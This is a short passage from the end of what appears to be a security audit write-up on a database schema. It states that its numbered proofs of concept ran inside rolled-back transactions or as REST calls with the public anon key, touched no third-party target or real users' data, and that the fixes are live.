rollback;`), or as plain REST calls with the public anon key (POC-9, POC-16,
POC-17). No third-party target, no real users' data, and no credentials
beyond the tester's own accounts. Every fix shown is live in the schema as
of this write-up.*
